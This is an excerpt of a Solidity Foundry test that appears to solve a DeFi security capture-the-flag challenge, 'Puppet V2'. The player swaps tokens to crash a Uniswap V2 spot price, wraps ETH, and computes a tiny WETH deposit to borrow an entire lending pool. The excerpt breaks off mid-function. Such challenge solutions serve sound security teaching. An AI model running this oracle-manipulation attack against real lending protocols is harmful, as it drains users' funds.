...
contract PuppetV2Challenge is Test {
    ...
    function test_puppetV2() public checkSolvedByPlayer {
        // Aegis sweep -> oracle spot-price manipulation (Uniswap V2 reserves). Dump tokens to crash
        // the price, wrap ETH, then borrow the whole pool for a tiny WETH deposit.
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uniswapV2Router.swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp);

        weth.deposit{value: player.balance}();
        uint256 poolTokens = token.balanceOf(address(lendingPool));
        uint256 dep = lendingPool.calculateDepositOfWETHRequired(poolTokens);
